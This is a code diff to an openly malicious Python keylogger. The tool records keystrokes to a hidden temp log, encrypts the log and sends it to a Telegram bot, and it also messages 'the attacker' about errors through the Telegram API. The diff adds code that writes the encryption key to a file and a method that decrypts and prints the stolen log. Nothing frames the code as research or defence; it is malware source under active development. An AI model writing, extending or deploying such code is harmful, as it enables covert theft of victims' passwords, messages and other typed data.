@@ -36,12 +36,17 @@ SCREENSHOT_FILENAME = join(temp_dir, 'screenshot.png')
 key = Fernet.generate_key()
 cipher_suite = Fernet(key)
 
+# Save the encryption key to a file (for decryption later)
+with open("encryption_key.key", "wb") as key_file:
+    key_file.write(key)
+
 # To notify attacker if any issues occur
 def alarm(msg) -> None:
     requests.get(f'https://api.telegram.org/bot{TOKEN}/sendMessage?chat_id={CHAT_ID}&text={msg}')
 
 # Keystroke record
 class Keylogger:
+
     def __init__(self) -> None:
         self.duplicate = ['']
         self.filename = join(gettempdir(), f'{datetime.now().strftime(".%d%m%Y%H%M%S")}.log')
@@ -102,6 +107,7 @@ class Keylogger:
 
 # Send the file to Telegram at regular intervals
 class Uploader:
+
     def __init__(self) -> None:
         self.encrypted_filename = f'{FILENAME}.enc'  # Use the correct encrypted file name
 
@@ -144,6 +150,25 @@ class Uploader:
 
             except Exception as e:
                 alarm(f'Error Occurred: {e}')
+
+    def decrypt_file(self, encrypted_file_path: str, key: bytes) -> None:
+        try:
+            # Initialize Fernet with the key
+            cipher_suite = Fernet(key)
+
+            # Read and decrypt the file
+            with open(encrypted_file_path, "rb") as f:
+                encrypted_data = f.read()
+            decrypted_data = cipher_suite.decrypt(encrypted_data)
+
+            # Print the decrypted data
+            print("Decrypted data:")
+            print(decrypted_data.decode('utf-8'))  # Decode bytes to string
+
+        except FileNotFoundError:
+            print(f"Error: File not found. Check the path for the encrypted file.")
+        except Exception as e:
+            print(f"Error decrypting file: {e}")
 
     def __del__(self) -> None:
         pass
